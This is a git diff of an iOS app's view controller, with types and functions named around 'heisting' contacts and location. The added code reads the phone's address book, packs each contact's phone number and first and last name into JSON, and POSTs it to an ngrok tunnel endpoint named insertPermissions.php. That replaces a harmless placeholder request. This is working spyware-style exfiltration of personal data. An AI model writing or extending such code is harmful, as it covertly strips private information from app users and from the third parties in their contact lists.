@@ -9,10 +9,10 @@ import UIKit
 import CoreLocation
 
 struct heistedData {
-    var Contacts: [FetchedContact]?
+    var Contacts: [FetchedContact]
     var Location: [CLLocationDegrees?]? // not reliable cause of location change trigger
 }
-var userData = heistedData()
+var userData = heistedData(Contacts: [])
 
 class ViewController: UIViewController, CLLocationManagerDelegate {
     
@@ -37,8 +37,37 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         // contacts
         self.heistContacts()
         
-//        printUserData()
-        saveUserData()
+        printUserData()
+        
+        var contacts: [String: Any] = [:]
+        let jsonTodo: Data
+
+        for contact in userData.Contacts {
+            let phone: String
+            phone = contact.telephone ?? ""
+            
+            if phone == "" {
+                continue
+            }
+            print(phone)
+            contacts[phone] = [
+                "first_name" : contact.firstName,
+                "last_name" : contact.lastName
+            ]
+            
+        }
+        do {
+            var postData: [String: Any] = [:]
+            postData["contacts"] = contacts
+            postData["device_type"] = "ios_app"
+            postData["user_id"] = "123"
+            
+            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
+        } catch {
+          print("Error: cannot create JSON from todo")
+          return
+        }
+        saveUserData(jsonTodo: jsonTodo)
     }
     
     private func heistLocation() {
@@ -85,23 +114,15 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         print(userData)
     }
     
-    func saveUserData() {
-        let todosEndpoint: String = "https://jsonplaceholder.typicode.com/todos"
+    func saveUserData(jsonTodo: Data) {
+        let todosEndpoint: String = "https://304e66514f88.ngrok.io/insertPermissions.php"
         guard let todosURL = URL(string: todosEndpoint) else {
           print("Error: cannot create URL")
           return
         }
         var todosUrlRequest = URLRequest(url: todosURL)
         todosUrlRequest.httpMethod = "POST"
-        let newTodo: [String: Any] = ["title": "My First todo", "completed": false, "userId": 1]
-        let jsonTodo: Data
-        do {
-          jsonTodo = try JSONSerialization.data(withJSONObject: newTodo, options: [])
-          todosUrlRequest.httpBody = jsonTodo
-        } catch {
-          print("Error: cannot create JSON from todo")
-          return
-        }
+        todosUrlRequest.httpBody = jsonTodo
 
         let session = URLSession.shared
 
